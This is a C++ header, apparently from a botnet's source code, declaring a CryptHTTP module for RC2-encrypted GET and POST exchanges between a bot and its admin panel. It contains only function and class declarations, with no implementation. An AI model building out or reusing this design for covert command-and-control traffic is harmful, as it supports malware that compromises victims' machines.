//***************************************************************************
//
//  Модуль включает шифрованный обмен данными бота с админкой
//
//***************************************************************************



//---------------------------------------------------------------------------

#ifndef CryptHTTPH
#define CryptHTTPH
//---------------------------------------------------------------------------

#include <windows.h>
#include "Strings.h"
#include "BotHTTP.h"
#include "BotSocket.h"


//****************************************************************************
//  CryptHTTP -  методы шифрованного обмена с HTTP сервером
//  Для шифрования используется RC2Crypt
//****************************************************************************

namespace CryptHTTP
{
	// Загрузить шифрованный документ
	bool Get(PCHAR URL, PCHAR Password, PCHAR *Buf, PHTTPResponseRec Response, bool MultiLineBuffer = false);

	// Функция отправляет зашифрованные пост данные на указанный
	// адрес. ключ берётся из глобальных настроек бота
	bool Post(PCHAR URL, PCHAR Password, PStrings Fields, PCHAR *Buf, PHTTPResponseRec Response, bool MultiLineBuffer = false);
}



//*******************************************************
// TCryptHTTP - класс шифрованной загрузки данных
//*******************************************************
class TCryptHTTP : public THTTP
{
protected:
	void DoBeforePostData(TBotStream* PostData);
	void DoDownloadCompleted(TBotStream* ResponseData);
public:
	string Password;

	TCryptHTTP() : THTTP() {};
	TCryptHTTP(TBotSocket* Socket) : THTTP(Socket) {};
};
//---------------------------------------------------------------------------
#endif
